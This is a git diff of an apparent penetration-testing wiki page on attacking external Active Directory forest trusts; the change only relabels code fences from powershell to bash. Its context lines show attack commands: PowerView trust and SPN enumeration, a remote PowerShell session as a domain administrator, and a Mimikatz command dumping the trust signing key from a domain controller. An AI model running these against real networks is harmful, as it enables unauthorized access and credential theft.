@@ -8,7 +8,7 @@ In this scenario an external domain is trusting you (or both are trusting each o
 
 First of all, you need to **enumerate** the **trust**:
 
-```powershell
+```bash
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
 TargetName      : domain.external  --> Destination domain
@@ -66,7 +66,7 @@ If you **couldn't** find any **special** access of your user in the other domain
 
 You can use **Powerview functions** to **enumerate** the **other domain** using the `-Domain` param like in:
 
-```powershell
+```bash
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
 
@@ -80,7 +80,7 @@ Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 
 Using a regular method with the credentials of the users who is has access to the external domain you should be able to access:
 
-```powershell
+```bash
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
 
@@ -93,7 +93,7 @@ If a user is migrated **from one forest to another** and **SID Filtering is not 
 > [!WARNING]
 > As a reminder, you can get the signing key with
 >
-> ```powershell
+> ```bash
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 > ```
 
